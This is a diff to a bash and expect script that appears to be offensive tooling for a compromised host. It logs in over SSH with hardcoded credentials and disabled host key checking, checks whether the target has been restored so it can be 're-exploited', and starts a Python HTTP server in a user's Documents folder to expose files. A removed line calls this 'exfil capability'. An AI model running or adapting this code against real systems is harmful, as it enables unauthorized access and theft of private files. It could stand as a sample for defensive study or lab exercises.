@@ -17,29 +17,36 @@ fi
 USERNAME="cindy"
 PASSWORD="D1r3ct0rIT"
 
-# Retrieve remote uptime in seconds using expect
-REMOTE_UPTIME=$(expect << EOF
+# Retrieve SNAPSHOTUPTIME value from the target host using expect
+SNAPSHOT_UPTIME_OUTPUT=$(expect << EOF
 set timeout -1
-spawn ssh -o StrictHostKeyChecking=no $USERNAME@$TARGET_IP "cat /proc/uptime"
+spawn ssh -o StrictHostKeyChecking=no $USERNAME@$TARGET_IP "cat /var/run/SNAPSHOTUPTIME"
 expect "password:"
 send "$PASSWORD\r"
-expect "\$ "
-send "exit\r"
 expect eof
 EOF
 )
 
-# Extract the uptime value from the expect output
-REMOTE_UPTIME_SECONDS=$(echo "$REMOTE_UPTIME" | grep -oP '^\d+\.\d+' | awk -F. '{print $1}')
+# Extract the SNAPSHOTUPTIME value from the expect output
+SNAPSHOT_UPTIME_MINUTES=$(echo "$SNAPSHOT_UPTIME_OUTPUT" | grep -Eo '^[0-9]+$')
+
+# Verify that the value is a valid number
+if ! [[ "$SNAPSHOT_UPTIME_MINUTES" =~ ^[0-9]+$ ]]; then
+    echo "Error: /var/run/SNAPSHOTUPTIME on the target host does not contain a valid number."
+    exit 1
+fi
+
+# Convert snapshot uptime to seconds
+SNAPSHOT_UPTIME_SECONDS=$((SNAPSHOT_UPTIME_MINUTES * 60))
 
 # Get the time since modification of passfile in seconds
 CURRENT_TIME=$(date +%s)
 PASSFILE_MOD_TIME=$(stat -c %Y /home/ncraf/castleexploits/passfile)
 FILE_UPTIME_SECONDS=$((CURRENT_TIME - PASSFILE_MOD_TIME))
 
-# Compare remote uptime and file uptime
-if [ "$REMOTE_UPTIME_SECONDS" -lt "$FILE_UPTIME_SECONDS" ]; then
-    echo "Must re-exploit! It seems as if the target system has been restored.."
+# Compare file uptime and snapshot uptime
+if [ "$FILE_UPTIME_SECONDS" -gt "$SNAPSHOT_UPTIME_SECONDS" ]; then
+    echo "Error: Time since passfile modification ($FILE_UPTIME_SECONDS s) exceeds SNAPSHOTUPTIME ($SNAPSHOT_UPTIME_SECONDS s) on the target host."
     exit 1
 fi
 
@@ -67,8 +74,6 @@ send "cd /home/cindy/Documents && nohup python -m SimpleHTTPServer $counter >/de
 send "exit\r"
 expect eof
 EOF
-
-echo "Exfil capability has been erected."
 
 # Increment the counter
 newPort=$((counter + 1))
